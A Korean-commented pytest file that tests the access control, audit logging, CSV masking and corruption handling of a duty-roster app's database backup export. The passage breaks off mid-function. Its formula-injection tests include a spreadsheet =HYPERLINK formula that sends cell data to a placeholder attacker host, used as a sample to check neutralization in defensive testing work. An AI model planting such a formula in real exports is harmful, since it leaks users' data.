def test_pen_empno_squatting_grants_nothing(client, env, monkeypatch):
    """사번 선점 — 운영자가 쓸 사번을 먼저 차지해도 권한은 따라오지 않는다."""
    monkeypatch.setenv(CLAIM_ENV, _new_claim_code())
    squatter = _reg(client, email="squat@duty.kr", empno=OWNER.empno,
                    name="가명선점자", ward="70")
    assert squatter["role"] == "master"
    r = client.get(BACKUP_URL, headers=_h(squatter["token"]))
    assert r.status_code == 403, f"사번 선점으로 백업이 열렸다: {r.status_code}"
    # 옛 방식(문자열 사번 allowlist)을 흉내 낸 환경변수를 켜도 마찬가지다.
    monkeypatch.setenv(LEGACY_STR_ENV, OWNER.empno)
    assert client.get(BACKUP_URL, headers=_h(squatter["token"])).status_code == 403


def test_pen_unicode_dotless_i_lookalike_denied(client, env, monkeypatch, code):
    """유니코드 접힘(ı, U+0131) 계정 — 여전히 막힌다.

    `"ı".upper() == "I"` 라서 대문자 비교를 쓰던 옛 방식에서는 **다른 이메일**이
    허가 계정으로 접혀 통과했다.
    """
    owner = _reg(client, email="kim.min@duty.kr", empno="990101", name="김서연", ward="61")
    _grant(client, owner, code)
    lookalike = _reg(client, email="kım.mın@duty.kr", empno="998002",
                     name="가명유사자", ward="71")
    assert lookalike["role"] == "master"
    assert lookalike["_pw"] == owner["_pw"]  # 같은 비밀번호라도 다른 계정
    r = client.get(BACKUP_URL, headers=_h(lookalike["token"]))
    assert r.status_code == 403, f"유니코드 유사 이메일이 통과했다: {r.status_code}"
    assert _flag_of(lookalike) == 0
    # 원래 소유자의 권한은 그대로여야 한다(오탐으로 잠기지 않았는지).
    assert client.get(BACKUP_URL, headers=_h(owner["token"])).status_code == 200


@pytest.mark.parametrize("value", ["1", "1,2,3", " 1 , 2 ", "0", "-1", "abc", "",
                                   "1;2", "999999"])
def test_legacy_uid_env_has_no_effect(client, people, monkeypatch, value):
    """제거된 `DUTY_BACKUP_OWNER_UID` — 어떤 값을 넣어도 아무도 통과하지 못한다."""
    monkeypatch.setenv(LEGACY_UID_ENV, value)
    for user in (people.owner, people.admin, people.staff, people.other):
        r = client.get(BACKUP_URL, headers=_h(user["token"]))
        assert r.status_code == 403, f"{LEGACY_UID_ENV}={value!r} 로 {r.status_code}"
        assert r.content[:2] != b"PK"


@pytest.mark.parametrize("value", ["seoyeon@duty.kr", "990001", "990001,jiwoo@duty.kr",
                                   "SEOYEON@DUTY.KR", "*"])
def test_legacy_string_env_has_no_effect(client, people, monkeypatch, value):
    """제거된 `DUTY_BACKUP_OWNER`(사번·이메일) — 설정해도 무효."""
    monkeypatch.setenv(LEGACY_STR_ENV, value)
    for user in (people.owner, people.admin, people.staff, people.other):
        assert client.get(BACKUP_URL, headers=_h(user["token"])).status_code == 403


def test_flag_disappears_with_database_reset(client, env, monkeypatch, tmp_path):
    """DB가 초기화되면 권한도 함께 사라진다 — D-19 전환의 존재 이유.

    (재등록이 필요한 것은 결함이 아니라 설계다.)
    """
    real_code = _new_claim_code()
    monkeypatch.setenv(CLAIM_ENV, real_code)
    owner = _reg(client, email=OWNER.email, empno=OWNER.empno, name=OWNER.name, ward="61")
    _grant(client, owner, real_code)
    assert client.get(BACKUP_URL, headers=_h(owner["token"])).status_code == 200

    # 볼륨 분실 = 새 빈 DB. 이후 첫 가입자가 uid 1을 물려받는다.
    fresh_db = tmp_path / "dbdir" / "reset.db"
    monkeypatch.setenv("DUTY_DB", str(fresh_db))
    newcomer = _reg(client, email="newcomer@duty.kr", empno="998003",
                    name="가명신규", ward="61")
    assert _uid_of(newcomer) == 1
    assert client.get(BACKUP_URL, headers=_h(newcomer["token"])).status_code == 403, \
        "초기화된 DB의 첫 가입자가 권한을 상속했다"
    # 코드를 아는 운영자만 다시 켤 수 있다.
    _grant(client, newcomer, real_code)
    assert client.get(BACKUP_URL, headers=_h(newcomer["token"])).status_code == 200


# ==================== 이력 3단계 (pending → 사람 확인 → confirm) ====================

def test_download_creates_pending_row_with_header_id(client, owner_ok):
    """내려받기는 `pending` 행 1개 + `X-Backup-Id` 헤더를 남긴다(아직 성공 아님).

    owner_ok의 권한 등록(claim)이 이미 `granted` 행을 남겼으므로(Q-1) **원시 행 수가
    아니라 status='pending'으로 걸러** 센다 — 계수 방식만 바뀐 것이고 동작은 그대로다.
    """
    r, bid = _download(client, owner_ok)
    pending = _rows_with("pending")
    assert len(pending) == 1, f"pending 행이 1개가 아님: {_log_rows()}"
    row = pending[0]
    assert row["id"] == bid, f"헤더 id({bid})와 기록 id({row['id']})가 다름"
    assert row["actor"] == f"uid:{_uid_of(owner_ok)}", f"actor 형식이 uid가 아님: {row}"
    assert row["byte_size"] == len(r.content), "pending 행에 실제 크기가 기록되지 않음"
    assert int(r.headers["x-backup-bytes"]) == len(r.content)
    # 내려받기가 권한 이력을 건드리지 않았는지: granted 행은 그대로 1개.
    assert len(_rows_with("granted")) == 1, _log_rows()


def test_pending_alone_is_not_a_success(client, owner_ok):
    """브라우저가 파일을 저장하지 못하면(=confirm 없음) 경고가 꺼지면 안 된다."""
    _download(client, owner_ok)
    body = _status(client, owner_ok)
    assert body["level"] == "critical", f"pending만 있는데 level={body['level']}"
    assert body["last_backup_at"] is None
    assert body["days_since"] is None


def test_confirm_marks_ok_and_clears_warning(client, owner_ok):
    """사람이 [확인했습니다]를 누른 뒤에야 `ok` 1행 + level=ok.

    행 수는 원시 계수가 아니라 status로 거른다 — owner_ok의 claim이 남긴 `granted`
    행이 함께 있기 때문(Q-1 부수 영향, 계수 방식만 조정).
    """
    r, bid = _download(client, owner_ok)
    conf = _confirm(client, owner_ok, bid, len(r.content))
    assert conf.status_code == 200, conf.text
    ok_rows = _rows_with("ok")
    assert len(ok_rows) == 1, f"ok 행이 1개가 아님: {_log_rows()}"
    assert ok_rows[0]["byte_size"] > 0
    body = _status(client, owner_ok)
    assert body["level"] == "ok" and body["days_since"] == 0, body
    assert conf.json()["level"] == "ok"


def test_confirm_size_mismatch_is_400_and_stays_pending(client, owner_ok):
    """받은 크기가 다르면 400 — 부분 전달을 성공으로 기록하지 않는다."""
    r, bid = _download(client, owner_ok)
    for wrong in (len(r.content) - 1, len(r.content) + 1, 0):
        bad = _confirm(client, owner_ok, bid, wrong)
        assert bad.status_code == 400, f"크기 {wrong}인데 {bad.status_code}"
    rows = _log_rows()
    assert rows[-1]["status"] == "pending", f"실패한 확정이 상태를 바꿨다: {rows}"
    assert _status(client, owner_ok)["level"] == "critical"


def test_confirm_of_another_users_row_is_404(client, people, code):
    """남의 pending 행은 확정할 수 없다(id를 알아도)."""
    _grant(client, people.owner, code)
    _grant(client, people.other, code)
    r, bid = _download(client, people.owner)
    other = _confirm(client, people.other, bid, len(r.content))
    assert other.status_code == 404, f"남의 행을 확정했다: {other.status_code}"
    rows = [x for x in _log_rows() if x["id"] == bid]
    assert rows[0]["status"] == "pending", f"남이 확정해 상태가 바뀜: {rows}"
    mine = _confirm(client, people.owner, bid, len(r.content))
    assert mine.status_code == 200


def test_confirm_unknown_id_is_404(client, owner_ok):
    assert _confirm(client, owner_ok, 99999, 10).status_code == 404


def test_confirm_is_idempotent(client, owner_ok):
    """같은 확정을 두 번 보내도 200이고 `ok` 행은 그대로 1개."""
    r, bid = _download(client, owner_ok)
    first = _confirm(client, owner_ok, bid, len(r.content))
    second = _confirm(client, owner_ok, bid, len(r.content))
    assert (first.status_code, second.status_code) == (200, 200), \
        (first.status_code, second.status_code)
    assert len(_rows_with("ok")) == 1, _log_rows()


def test_denied_export_attempts_are_logged(client, people, code):
    """반출 시도 거부는 `denied`로 남는다(침입 탐지 수단)."""
    _grant(client, people.owner, code)
    for _ in range(3):
        assert client.get(BACKUP_URL, headers=_h(people.staff["token"])).status_code == 403
    denied = _rows_with("denied")
    actor = f"uid:{_uid_of(people.staff)}"
    assert [d["actor"] for d in denied] == [actor], f"거부 이력이 1행이 아님: {denied}"


def test_status_check_by_non_owner_leaves_no_log_row(client, people, code):
    """화면이 카드를 그릴지 판단하려고 호출하는 /status 거부는 이력에 남기지 않는다.

    (남기면 정상 이용이 전부 '침입 시도'로 쌓여 로그가 무의미해진다.)
    """
    _grant(client, people.owner, code)
    for user in (people.staff, people.admin, people.other):
        assert client.get(STATUS_URL, headers=_h(user["token"])).status_code == 403
    assert _rows_with("denied") == [], f"status 거부가 이력에 남았다: {_log_rows()}"


def test_denied_last_30d_counts_recent_only(client, owner_ok):
    """/status 의 `denied_last_30d` — 최근 30일(KST) 거부 시도 수."""
    uid = _uid_of(owner_ok)
    _insert_log_row(_kst_days_ago(1), status="denied", uid=uid + 10, size=0)
    _insert_log_row(_kst_days_ago(29), status="denied", uid=uid + 11, size=0)
    _insert_log_row(_kst_days_ago(45), status="denied", uid=uid + 12, size=0)
    body = _status(client, owner_ok)
    assert body["denied_last_30d"] == 2, \
        f"최근 30일 거부 수가 2가 아님: {body} / {_log_rows()}"


# ==================== 경고 단계(level) — ok 행만 센다 ====================

def test_no_history_is_critical(client, owner_ok):
    _set_last_backup(None)
    body = _status(client, owner_ok)
    assert body["level"] == "critical" and body["last_backup_at"] is None, body


@pytest.mark.parametrize("days,level", [
    (0, "ok"), (1, "ok"), (29, "ok"), (30, "warn"), (31, "warn"),
    (44, "warn"), (45, "critical"), (60, "critical")])
def test_level_thresholds_by_kst_elapsed_days(client, owner_ok, days, level):
    """KST 경과일 29→ok / 30→warn / 45→critical."""
    _set_last_backup(_kst_days_ago(days))
    body = _status(client, owner_ok)
    assert body["days_since"] == days, f"경과일 {body['days_since']} != {days} ({body})"
    assert body["level"] == level, f"{days}일 → {body['level']} (기대 {level})"


@pytest.mark.parametrize("days,level", [(29, "ok"), (30, "warn"), (45, "critical")])
def test_boundary_uses_kst_not_utc(client, owner_ok, days, level):
    """UTC 달력으로 세면 결과가 달라지는 시각에서도 KST 결과가 나온다(교훈 L-4)."""
    dt = _kst_days_ago(days, flip_utc_date=True)
    utc_days = _utc_date_diff(dt)
    assert utc_days != days, f"테스트 자기검증 실패: UTC 경과일({utc_days})이 KST와 같음"
    _set_last_backup(dt)
    body = _status(client, owner_ok)
    assert body["days_since"] == days, f"KST 경과일이 아님: {body} (UTC로는 {utc_days})"
    assert body["level"] == level, body


@pytest.mark.parametrize("status", ["pending", "fail", "denied", "archived"])
def test_level_counts_ok_rows_only(client, owner_ok, status):
    """`ok`가 아닌 행(pending·fail·denied·**archived**)은 경고를 끄지 못한다."""
    _set_last_backup(_kst_days_ago(0), status=status)
    body = _status(client, owner_ok)
    assert body["level"] == "critical", f"status={status} 행이 경고를 껐다: {body}"
    assert body["last_backup_at"] is None, body


def test_future_ok_row_alone_is_critical(client, owner_ok):
    """미래 시각 `ok` 행(시계 역행·조작)은 신뢰하지 않는다 — critical."""
    _set_last_backup(datetime.now(KST) + timedelta(days=3))
    body = _status(client, owner_ok)
    assert body["level"] == "critical", f"미래 시각 행이 안전으로 읽혔다: {body}"


def test_new_backup_overrides_a_future_row(client, owner_ok):
    """**기록 순서(id)** 로 최신 행을 고른다 — 미래 시각 행이 있어도 이후 정상 백업이
    경고를 끌 수 있어야 한다(created_at 정렬이면 영원히 빠져나오지 못한다)."""
    _set_last_backup(datetime.now(KST) + timedelta(days=30))
    assert _status(client, owner_ok)["level"] == "critical"
    _full_backup(client, owner_ok)
    body = _status(client, owner_ok)
    assert body["level"] == "ok", f"정상 백업을 했는데도 {body}"
    assert body["days_since"] == 0, body


def test_level_for_unit_boundaries():
    """단위 함수 경계 — 29/30/44/45, 음수·미상."""
    from app.backup import level_for

    assert (level_for(0), level_for(29)) == ("ok", "ok")
    assert (level_for(30), level_for(44)) == ("warn", "warn")
    assert (level_for(45), level_for(10000)) == ("critical", "critical")
    assert level_for(None) == "critical"
    for negative in (-1, -30):
        assert level_for(negative) == "critical", f"{negative}일이 critical이 아님"


# ==================== 산출물 구성 (ZIP / CSV / README) ====================

def test_zip_contains_db_seven_csv_and_readme(client, owner_ok, tmp_path):
    """ZIP = duty.db 1개 + CSV 7개 + README.txt (수용 기준 3)."""
    _feedback(client, owner_ok, "백업 확인용 피드백")
    r, _ = _download(client, owner_ok)
    zf = _zip_of(r)
    names = set(zf.namelist())
    assert "duty.db" in names and "README.txt" in names, names
    assert _csv_names(zf) == EXPECTED_CSV_TABLES, \
        f"CSV 테이블 구성이 다름: {sorted(_csv_names(zf))}"
    restored = _extract_db(zf, tmp_path)
    conn = sqlite3.connect(restored)
    try:
        assert str(conn.execute("PRAGMA quick_check").fetchone()[0]).lower() == "ok"
        assert conn.execute("SELECT COUNT(*) FROM users").fetchone()[0] >= 1
    finally:
        conn.close()


def test_every_csv_starts_with_bom_and_keeps_korean(client, owner_ok):
    """CSV 첫 3바이트가 UTF-8 BOM이고 한글 값이 깨지지 않는다."""
    _feedback(client, owner_ok, "한글 피드백 원문 — 백업에 실린다")
    zf = _zip_of(_download(client, owner_ok)[0])
    for table in EXPECTED_CSV_TABLES:
        raw = zf.read(f"tables/{table}.csv")
        assert raw[:3] == BOM, f"{table}.csv BOM 없음: {raw[:6]!r}"
    users = _csv_rows(zf, "users")
    assert any(u["name"] == OWNER.name for u in users), \
        f"한글 이름이 CSV에 온전히 실리지 않음: {[u['name'] for u in users]}"
    fb = _csv_rows(zf, "feedback")
    assert any("한글 피드백 원문" in f["message"] for f in fb), fb


def test_readme_is_korean_with_kst_time_and_row_counts(client, owner_ok):
    """README: 한국어 안내 + KST 백업 시각 + **주요 테이블 행수** + 개인정보 경고."""
    zf = _zip_of(_download(client, owner_ok)[0])
    raw = zf.read("README.txt")
    assert raw[:3] == BOM, f"README에 BOM이 없다(구형 메모장 한글 깨짐): {raw[:6]!r}"
    text = raw.decode("utf-8-sig")
    assert "\r\n" in text and "\n" not in text.replace("\r\n", ""), \
        "README 줄바꿈이 CRLF가 아니다(구형 메모장에서 한 줄로 붙는다)"
    now_kst = datetime.now(KST)
    assert f"{now_kst:%Y년 %m월}" in text, f"KST 백업 시각이 없음:\n{text[:400]}"
    for keyword in ("복구", "개인정보"):
        assert keyword in text, f"README에 '{keyword}' 안내가 없음"
    assert ("공유" in text) or ("전달하지" in text), \
        f"README에 '공유 금지' 취지의 문구가 없음:\n{text[-600:]}"
    # 행수: 실제 users 행수가 README에 적혀 있어야 한다.
    conn = _db()
    try:
        n_users = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
    finally:
        conn.close()
    m = re.search(r"users\s*:\s*([\d,]+)건", text)
    assert m, f"README에 users 행수가 없음:\n{text[:800]}"
    assert int(m.group(1).replace(",", "")) == n_users, \
        f"README 행수({m.group(1)})가 실제({n_users})와 다름"


def test_row_counts_reflect_real_data(client, owner_ok):
    """행수가 고정 문구가 아니라 **실제 데이터**를 따라간다."""
    zf1 = _zip_of(_download(client, owner_ok)[0])
    before = re.search(r"feedback\s*:\s*([\d,]+)건", zf1.read("README.txt").decode("utf-8-sig"))
    assert before, "README에 feedback 행수가 없음"
    for i in range(3):
        _feedback(client, owner_ok, f"행수 확인용 {i}")
    zf2 = _zip_of(_download(client, owner_ok)[0])
    after = re.search(r"feedback\s*:\s*([\d,]+)건", zf2.read("README.txt").decode("utf-8-sig"))
    assert int(after.group(1)) == int(before.group(1)) + 3, \
        f"행수가 실제를 따라가지 않음: {before.group(1)} → {after.group(1)}"


# ==================== 데이터 보호 — 마스킹 / 절단 / 수식 ====================

def test_csv_masks_declared_credentials(client, owner_ok):
    """`users.pw_hash`·`users.salt`·`ward_invites.code` 는 CSV에서 값이 지워진다."""
    zf = _zip_of(_download(client, owner_ok)[0])
    conn = _db()
    try:
        real = {
            ("users", "pw_hash"): [r[0] for r in conn.execute("SELECT pw_hash FROM users")],
            ("users", "salt"): [r[0] for r in conn.execute("SELECT salt FROM users")],
            ("ward_invites", "code"): [r[0] for r in conn.execute("SELECT code FROM ward_invites")],
        }
    finally:
        conn.close()
    blob = b"".join(zf.read(n) for n in zf.namelist() if n.startswith("tables/"))
    for (table, col), values in real.items():
        rows = _csv_rows(zf, table)
        assert rows, f"{table}.csv 가 비어 있음"
        for row in rows:
            assert row[col] == "(생략)", f"{table}.{col} 가 마스킹되지 않음: {row[col]!r}"
        for v in values:
            assert v, "테스트 자기검증 실패: 원본 값이 비어 있음"
            assert v.encode() not in blob, f"{table}.{col} 값이 CSV 어딘가에 남아 있음"


def test_csv_masks_newly_added_credential_columns(client, owner_ok):
    """**fail-closed**: 명시 목록에 없는 새 자격증명 컬럼도 이름으로 걸러 가린다.

    검수부가 `users`에 `reset_token`을 추가했더니 평문으로 실려 나간 결함의 회귀 테스트.
    """
    marker = {}
    conn = _db()
    try:
        for col in NEW_SECRET_COLUMNS:
            value = "QA-LEAK-" + secrets.token_hex(8)
            marker[col] = value
            conn.execute(f"ALTER TABLE users ADD COLUMN {col} TEXT")
            conn.execute(f"UPDATE users SET {col}=?", (value,))
        conn.commit()
    finally:
        conn.close()

    zf = _zip_of(_download(client, owner_ok)[0])
    blob = b"".join(zf.read(n) for n in zf.namelist() if n.startswith("tables/"))
    rows = _csv_rows(zf, "users")
    for col, value in marker.items():
        assert col in rows[0], f"새 컬럼 {col}이 CSV에 아예 없음(스키마 반영 실패): {list(rows[0])}"
        for row in rows:
            assert row[col] == "(생략)", f"{col}이 평문으로 나감: {row[col]!r}"
        assert value.encode() not in blob, f"{col} 값이 CSV에 남아 있음"


def test_master_db_keeps_real_values_for_recovery(client, owner_ok, tmp_path):
    """정본 `duty.db`에는 가려진 값이 **그대로** 있어야 한다(복구 능력 유지)."""
    conn = _db()
    try:
        expect_pw = {r[0] for r in conn.execute("SELECT pw_hash FROM users")}
        expect_code = {r[0] for r in conn.execute("SELECT code FROM ward_invites")}
        expect_data = {r[0] for r in conn.execute("SELECT data FROM rosters")}
    finally:
        conn.close()
    zf = _zip_of(_download(client, owner_ok)[0])
    restored = _extract_db(zf, tmp_path)
    conn = sqlite3.connect(restored)
    try:
        assert {r[0] for r in conn.execute("SELECT pw_hash FROM users")} == expect_pw
        assert {r[0] for r in conn.execute("SELECT code FROM ward_invites")} == expect_code
        assert {r[0] for r in conn.execute("SELECT data FROM rosters")} == expect_data
        assert "(생략)" not in "".join(
            str(r[0]) for r in conn.execute("SELECT pw_hash FROM users"))
    finally:
        conn.close()


def test_json_columns_are_replaced_in_csv_only(client, owner_ok, tmp_path):
    """`rosters.data`·`schedules.data` 는 CSV에서 안내 문구로 대체, duty.db는 무손상."""
    payload = json.dumps({"nurses": [{"name": "가명간호사", "team": 1}]}, ensure_ascii=False)
    conn = _db()
    try:
        conn.execute("INSERT OR REPLACE INTO rosters (ward, data, updated_at, updated_by) "
                     "VALUES (?,?,?,?)", ("61", payload, _kst_days_ago(0).isoformat(), "uid:1"))
        conn.execute("INSERT OR REPLACE INTO schedules (ward, year, month, data, updated_at,"
                     " updated_by) VALUES (?,?,?,?,?,?)",
                     ("61", 2026, 8, payload, _kst_days_ago(0).isoformat(), "uid:1"))
        conn.commit()
    finally:
        conn.close()

    zf = _zip_of(_download(client, owner_ok)[0])
    for table in ("rosters", "schedules"):
        rows = _csv_rows(zf, table)
        assert rows, f"{table}.csv 가 비어 있음"
        for row in rows:
            assert row["data"] == "(JSON — duty.db 참조)", \
                f"{table}.data 가 대체되지 않음: {row['data'][:80]!r}"
    restored = _extract_db(zf, tmp_path)
    conn = sqlite3.connect(restored)
    try:
        assert conn.execute("SELECT data FROM rosters WHERE ward='61'").fetchone()[0] == payload
        assert conn.execute("SELECT data FROM schedules WHERE ward='61'").fetchone()[0] == payload
    finally:
        conn.close()


def test_oversized_cell_is_truncated_in_csv_only(client, owner_ok, tmp_path):
    """길이 상한을 넘는 셀은 CSV에서 잘린다 — 정본은 온전하다."""
    from app.backup import MAX_CELL_CHARS

    long_text = "가" * (MAX_CELL_CHARS + 5000)
    conn = _db()
    try:
        conn.execute("INSERT INTO feedback (ward, from_email, from_name, message, created_at)"
                     " VALUES (?,?,?,?,?)",
                     ("61", STAFF.email, "가명제보자", long_text,
                      datetime.now(timezone.utc).isoformat()))
        conn.commit()
    finally:
        conn.close()

    zf = _zip_of(_download(client, owner_ok)[0])
    cells = [row["message"] for row in _csv_rows(zf, "feedback")]
    big = [c for c in cells if c.startswith("가")]
    assert big, f"긴 피드백이 CSV에 없음: {[c[:20] for c in cells]}"
    cell = big[0]
    assert len(cell) < len(long_text), "상한을 넘는 셀이 그대로 실렸다"
    assert "생략" in cell, f"절단 표시가 없음: ...{cell[-40:]!r}"
    restored = _extract_db(zf, tmp_path)
    conn = sqlite3.connect(restored)
    try:
        stored = conn.execute(
            "SELECT message FROM feedback WHERE message LIKE '가%'").fetchone()[0]
    finally:
        conn.close()
    assert stored == long_text, "정본 duty.db의 값이 잘렸다(복구 손실)"


FORMULA_SAMPLES = [
    "=HYPERLINK(\"http://evil.example/?d=\"&A1,\"급여명세\")",
    "+1+1",
    "-2+3",
    "@SUM(A1:A9)",
    "\tTAB으로 시작",
    "\r캐리지리턴으로 시작",
]


def test_csv_formula_injection_is_neutralized(client, owner_ok, tmp_path):
    """수식으로 해석될 수 있는 값 앞에 `'`를 붙인다 — 정본은 무변경."""
    conn = _db()
    try:
        conn.executemany(
            "INSERT INTO feedback (ward, from_email, from_name, message, created_at)"
            " VALUES (?,?,?,?,?)",
            [("61", STAFF.email, "가명제보자", s, datetime.now(timezone.utc).isoformat())
             for s in FORMULA_SAMPLES])
        conn.commit()
    finally:
        conn.close()

    zf = _zip_of(_download(client, owner_ok)[0])
    # CSV 원문에서 직접 확인한다 — 파서를 거치면 따옴표·CR 처리가 섞여 판정이 흐려진다.
    text = zf.read("tables/feedback.csv").decode("utf-8-sig")
    for sample in FORMULA_SAMPLES:
        escaped = ("'" + sample).replace('"', '""')  # csv가 큰따옴표를 두 번 쓴다
        assert escaped in text, (
            f"수식 인젝션이 차단되지 않았다: {sample!r} — 앞에 작은따옴표가 없다")
        assert ('\n' + sample.replace('"', '""')) not in text, \
            f"원문 그대로 실린 셀이 있다: {sample!r}"
    restored = _extract_db(zf, tmp_path)
    conn = sqlite3.connect(restored)
    try:
        stored = {r[0] for r in conn.execute("SELECT message FROM feedback")}
    finally:
        conn.close()
    for sample in FORMULA_SAMPLES:
        assert sample in stored, f"정본의 값이 바뀌었다: {sample!r}"


def test_feedback_written_through_the_app_is_also_neutralized(client, owner_ok):
    """부서원이 화면으로 쓴 피드백(=HYPERLINK...)도 같은 규칙으로 막힌다."""
    _feedback(client, owner_ok, FORMULA_SAMPLES[0])
    zf = _zip_of(_download(client, owner_ok)[0])
    text = zf.read("tables/feedback.csv").decode("utf-8-sig")
    escaped = ("'" + FORMULA_SAMPLES[0]).replace('"', '""')
    assert escaped in text, f"화면으로 쓴 수식이 그대로 실렸다:\n{text[:400]}"


# ==================== 수용 기준 2 — 일관성 (스냅샷) ====================

def test_row_committed_just_before_backup_is_in_db_and_csv(client, owner_ok, tmp_path):
    """백업 직전 커밋된 행이 ZIP의 duty.db와 CSV **양쪽**에 있다."""
    marker = "직전커밋-" + secrets.token_hex(6)
    _feedback(client, owner_ok, marker)
    zf = _zip_of(_download(client, owner_ok)[0])
    assert any(marker in row["message"] for row in _csv_rows(zf, "feedback")), \
        "직전 커밋 행이 CSV에 없음"
    restored = _extract_db(zf, tmp_path)
    conn = sqlite3.connect(restored)
    try:
        n = conn.execute("SELECT COUNT(*) FROM feedback WHERE message=?", (marker,)).fetchone()[0]
    finally:
        conn.close()
    assert n == 1, "직전 커밋 행이 duty.db 사본에 없음"


def test_original_db_stays_usable_during_and_after_backup(client, owner_ok, monkeypatch):
    """백업 중·후에도 원본 DB 읽기·쓰기가 계속 성공한다."""
    import app.backup as backup

    real_snapshot = backup._snapshot
    during = {}

    def _snapshot_with_traffic(dest_path):
        try:
            r = client.post("/api/feedback", json={"message": "백업 중 쓰기"},
                            headers=_h(owner_ok["token"]))
            during["write"] = r.status_code
            during["read"] = client.get("/api/roster", headers=_h(owner_ok["token"])).status_code
        except Exception as exc:  # noqa: BLE001
            during["exc"] = repr(exc)
        return real_snapshot(dest_path)

    monkeypatch.setattr(backup, "_snapshot", _snapshot_with_traffic)
    r, _ = _download(client, owner_ok)
    assert r.status_code == 200
    assert during.get("write") == 200, f"백업 중 쓰기 실패: {during}"
    assert during.get("read") == 200, f"백업 중 읽기 실패: {during}"
    after = client.post("/api/feedback", json={"message": "백업 후 쓰기"},
                        headers=_h(owner_ok["token"]))
    assert after.status_code == 200, f"백업 후 쓰기 실패: {after.status_code}"


def test_no_temp_files_left_after_success(client, owner_ok, env):
    """성공 경로: 요청이 끝나면 임시 백업 파일이 하나도 남지 않는다."""
    before_tmp, before_db = _files_under(env.tmp_dir), _files_under(env.db_dir)
    _full_backup(client, owner_ok)
    _assert_no_leftovers(env, before_tmp, before_db, where="(성공 경로)")


# ==================== 무결성·안정성 ====================

CORRUPT_MARKER = "손상표식-품질부-" + "표" * 200


def _corrupt_db() -> None:
    """운영 DB의 **일부 데이터 페이지만** 손상시킨다(인증 경로는 살려 둔다)."""
    conn = _db()
    try:
        conn.executemany(
            "INSERT INTO feedback (ward, from_email, from_name, message, created_at) "
            "VALUES (?,?,?,?,?)",
            [("61", STAFF.email, "가명제보자", f"{CORRUPT_MARKER}{i}",
              datetime.now(timezone.utc).isoformat()) for i in range(300)])
        conn.commit()
        conn.execute("PRAGMA wal_checkpoint(TRUNCATE)")
        page_size = conn.execute("PRAGMA page_size").fetchone()[0]
    finally:
        conn.close()

    path = os.environ["DUTY_DB"]
    needle = CORRUPT_MARKER.encode()
    with open(path, "rb") as f:
        raw = f.read()
    pages, start = set(), 0
    while True:
        found = raw.find(needle, start)
        if found < 0:
            break
        pages.add(found // page_size)
        start = found + 1
    pages.discard(0)
    assert len(pages) >= 5, f"손상시킬 표식 페이지를 찾지 못함: {sorted(pages)}"
    with open(path, "r+b") as f:
        for page in sorted(pages)[:5]:
            f.seek(page * page_size)
            f.write(b"\xde\xad\xbe\xef" * (page_size // 4))
        f.flush()
        os.fsync(f.fileno())


def test_structural_corruption_is_500_and_logged_fail(client, owner_ok, env):
    """**구조 손상**이면 200+ZIP이 아니라 500 + `fail` 이력 + 잔여물 0.

    (값 오염은 검출 대상이 아니라고 기준에 명시돼 있다 — 여기서 요구하지 않는다.)
    """
    _full_backup(client, owner_ok)
    rows_before = len(_log_rows())
    before_tmp, before_db = _files_under(env.tmp_dir), _files_under(env.db_dir)

    _corrupt_db()
    probe = sqlite3.connect(os.environ["DUTY_DB"])
    try:
        assert probe.execute("SELECT COUNT(*) FROM users").fetchone()[0] > 0
        with pytest.raises(sqlite3.DatabaseError):
            probe.execute("PRAGMA quick_check").fetchone()
    finally:
        probe.close()

    r = client.get(BACKUP_URL, headers=_h(owner_ok["token"]))
    assert r.status_code == 500, f"손상된 DB인데 {r.status_code} (본문 {r.content[:8]!r})"
    assert r.content[:2] != b"PK", "손상된 DB인데 ZIP을 내려줌"
    rows = _log_rows()
    assert len(rows) == rows_before + 1 and rows[-1]["status"] == "fail", rows
    _assert_no_leftovers(env, before_tmp, before_db, where="(손상 경로)")


class _NoVacuumIntoConn(sqlite3.Connection):
    """VACUUM INTO가 없는 SQLite 빌드를 흉내 내 **폴백 경로**로 몰아넣는 연결."""

    def execute(self, sql, *args, **kwargs):
        if str(sql).strip().upper().startswith("VACUUM INTO"):
            raise sqlite3.OperationalError('near "INTO": syntax error')
        return super().execute(sql, *args, **kwargs)


class _NoVacuumIntoSqlite:
    def __getattr__(self, name):
        return getattr(sqlite3, name)

    def connect(self, *args, **kwargs):
        kwargs.setdefault("factory", _NoVacuumIntoConn)
        return sqlite3.connect(*args, **kwargs)


def _corrupt_index_pages(count: int = 8) -> None:
    """인덱스 페이지만 손상 — 표 스캔으로는 드러나지 않는 손상(quick_check만 잡는다)."""
    conn = _db()
    try:
        conn.executemany(
            "INSERT INTO users (email, empno, name, ward, role, pw_hash, salt, created_at) "
            "VALUES (?,?,?,?,?,?,?,?)",
            [(f"qa{i:05d}@duty.kr", f"99{i:05d}", "가명", "61", "staff",
              "h" * 40, "s" * 16, datetime.now(timezone.utc).isoformat())
             for i in range(3000)])
        conn.commit()
        conn.execute("PRAGMA wal_checkpoint(TRUNCATE)")
        page_size = conn.execute("PRAGMA page_size").fetchone()[0]
    finally:
        conn.close()
    path = os.environ["DUTY_DB"]
    with open(path, "rb") as f:
        raw = f.read()
    victims = [p for p in range(1, len(raw) // page_size) if raw[p * page_size] == 0x0A]
    assert len(victims) >= count, f"손상시킬 인덱스 페이지가 부족함: {len(victims)}개"
    with open(path, "r+b") as f:
        for page in victims[:count]:
            f.seek(page * page_size)
            f.write(b"\xde\xad\xbe\xef" * (page_size // 4))
        f.flush()
        os.fsync(f.fileno())


def test_fallback_path_also_blocks_corrupt_snapshot(client, owner_ok, monkeypatch, env):
    """폴백(페이지 그대로 복사) 경로에서도 손상본을 내려주지 않는다."""
    import app.backup as backup

    monkeypatch.setattr(backup, "sqlite3", _NoVacuumIntoSqlite())
    before_tmp, before_db = _files_under(env.tmp_dir), _files_under(env.db_dir)
    _corrupt_index_pages()

    probe = sqlite3.connect(os.environ["DUTY_DB"])
    try:
        report = str(probe.execute("PRAGMA quick_check").fetchone()[0])
    finally:
        probe.close()
    assert report.lower() != "ok", "테스트 자기검증 실패: 손상이 만들어지지 않음"

    r = client.get(BACKUP_URL, headers=_h(owner_ok["token"]))
    assert r.status_code == 500, f"손상 사본인데 {r.status_code}"
    assert r.content[:2] != b"PK"
    assert _log_rows()[-1]["status"] == "fail", _log_rows()
    _assert_no_leftovers(env, before_tmp, before_db, where="(폴백 손상 경로)")


def _sqlite_proxy(vacuum_error: str, calls: list):
    """VACUUM INTO만 지정한 오류로 실패시키고, 폴백 backup() 호출을 세는 프록시."""

    class _Conn(sqlite3.Connection):
        def execute(self, sql, *args, **kwargs):
